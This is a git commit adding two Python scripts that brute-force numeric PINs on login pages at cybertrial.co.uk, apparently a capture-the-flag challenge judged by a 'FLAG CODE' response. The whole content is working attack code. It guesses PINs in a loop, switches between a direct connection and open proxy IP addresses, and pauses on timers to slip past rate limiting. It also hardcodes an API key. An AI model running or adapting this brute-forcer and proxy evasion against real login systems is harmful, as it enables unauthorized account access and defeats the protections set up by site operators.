eeea1a9e198ebd8167f200c0b00e5ee87025e4e7
root <root@localhost.localdomain>
2019-11-03 12:48:08 +0000

    added firewall scripts

---
+++ firewall_1.py
@@ -0,0 +1,70 @@
+import requests
+import time
+import os
+import random
+from bs4 import BeautifulSoup
+
+time_count = 0
+def timer(time_count, new_time=0):
+    if (new_time):
+        time_count = new_time
+
+    if (time_count <= 0):
+        return
+    else:
+        print('time left: {}'.format(time_count), end='\r')
+        time_count -= 1
+        time.sleep(1)
+        timer(time_count)
+
+api_key = 'kZ!agZ!Kef59xqCg!Gtds!nbuenPMCCGgL!!VR3y'
+url = 'http://102.cybertrial.co.uk/login'
+
+proxies = {'http': 'http://51.79.31.188:8080'} 
+
+r = requests.session()
+r.get(url + '?mykey=' + api_key)
+proxy_active = False
+
+pins = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
+tried = []
+for e in tried:
+    pins.remove(tried)
+for pin in range(11):
+    # choose a random number from pins, then remove it from the list
+    if (len(pins) == 1):
+        print('pin found: {}'.format(pins[0]))
+        for i in range(5):
+            os.system('beep')
+        exit(0)
+    pin = random.choice(pins)
+    pins.remove(pin)
+
+    print('trying: {}'.format(pin))
+    if proxy_active:
+        resp = r.post(url, {'formgo':1, 'pin':pin,}, proxies=proxies)
+    else:
+        resp = r.post(url, {'formgo':1, 'pin':pin})
+    
+    if ('FLAG CODE' in resp.text):
+        print('pin found: {}'.format(pin))
+        for i in range(5):
+            os.system('beep')
+        exit(0)
+    else:
+        print('incorrect pin')
+        
+        f = open('tmp/{}'.format(pin), 'w')
+        f.write(resp.text)
+        f.close()
+        os.system('beep')
+
+        if not proxy_active:
+            #print('activating proxy')
+            proxy_active = True
+        else:
+            #print('stopping proxy')
+            proxy_active = False
+            #print('sleeping for 300 seconds')
+            time_count = 0
+            timer(time_count, 300)
---
+++ firewall_2.py
@@ -0,0 +1,80 @@
+import requests
+import time
+import os
+import sys
+import random
+
+if len(sys.argv) != 2:
+    print('need a timeout value')
+    exit(1)
+time_out = int(sys.argv[1])
+
+time_count = 0
+def timer(time_count, new_time=0):
+    if (new_time):
+        time_count = new_time
+
+    if (time_count <= 0):
+        return
+    else:
+        print('time left: {}'.format(time_count), end='\r')
+        time_count -= 1
+        time.sleep(1)
+        timer(time_count)
+
+api_key = 'kZ!agZ!Kef59xqCg!Gtds!nbuenPMCCGgL!!VR3y'
+url = 'http://103.cybertrial.co.uk/login'
+
+proxies = {'http': 'http://68.183.35.11:3128'} 
+
+r = requests.session()
+r.get(url + '?mykey=' + api_key)
+proxy_active = False
+
+incorrect_count = 0
+
+pins = ["%.2d" % i for i in range(100)]
+tried = []
+for e in tried:
+    pins.remove(tried)
+for pin in range(100):
+    # choose a random number from pins, then remove it from the list
+    if (len(pins) == 1):
+        print('pin found: {}'.format(pins[0]))
+        for i in range(5):
+            os.system('beep')
+        exit(0)
+    pin = random.choice(pins)
+    pins.remove(pin)
+
+    print('trying: {}'.format(pin))
+    if proxy_active:
+        resp = r.post(url, {'formgo':1, 'pin':pin,}, proxies=proxies)
+    else:
+        resp = r.post(url, {'formgo':1, 'pin':pin})
+    
+    if ('FLAG CODE' in resp.text):
+        print('pin found: {}'.format(pin))
+        for i in range(5):
+            os.system('beep')
+        exit(0)
+    else:
+        print('incorrect pin')
+        
+        incorrect_count += 1
+        #f = open('tmp/{}'.format(pin), 'w')
+        #f.write(resp.text)
+        #f.close()
+        #os.system('beep')
+
+        if incorrect_count >= 5:
+            incorrect_count = 0
+            if not proxy_active:
+                #print('activating proxy')
+                proxy_active = True
+            else:
+                #print('stopping proxy')
+                proxy_active = False
+                #print('sleeping for 300 seconds')
+                time_count = 0
+                timer(time_count, time_out)
